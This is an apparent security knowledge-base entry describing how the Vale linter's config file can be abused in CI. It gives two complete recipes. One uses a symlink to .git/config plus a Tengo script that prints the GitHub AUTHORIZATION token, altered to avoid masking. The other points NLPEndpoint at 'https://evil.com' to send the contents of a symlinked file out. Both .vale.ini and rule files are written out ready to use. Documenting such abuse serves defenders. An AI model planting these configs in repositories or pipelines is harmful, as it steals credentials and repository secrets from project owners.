---
title: Vale
tags:
 - cli
 - config-file
references: 
 - https://vale.sh/
 - https://github.com/errata-ai/vale
 - https://github.com/errata-ai/vale-action
files: [.vale.ini]
---

`vale` is an open-source meta-linting tool that supports external style through its extension system.

## Tengo

`vale` can use [Tengo](https://github.com/d5/tengo) scripting language to run a script, which is limited to only "text", "fmt" and "math" go modules.
This allow exfiltration of GitHub token.
 - Add a symbolic file pointing to `.git/config` such as `pwned`
 - Set the `.vale.ini` to:

```ini
StylesPath = .
[pwned]
BasedOnStyles = myStyle
```

   - Add `./myStyle/read.yml`:

```yaml
extends: script
message: ''
scope: raw
script: |
 fmt := import("fmt")
 text := import("text")
 found := text.re_find("AUTHORIZATION: .*", scope, 1)
 if (found != undefined){
 fmt.println(text.replace(found[0][0].text, '=', '_', 100))
 }
```

## NLPEndpoint

`vale` gives access to the NLPEndpoint which can be used to exfiltrate data if the rule has the `sentence` scope.
 - Add a symbolic file named `.txt` pointing to the target file
 - Set the `.vale.ini` to:

```ini
StylesPath = .
NLPEndpoint = 'https://evil.com'
[pwned.txt]
Lang = 'fr'
BasedOnStyles = myStyle
```

 - Add `./myStyle/read.yml`:

```yaml
extends: existence
scope: sentence
message: ''
raw:
 - .*
```

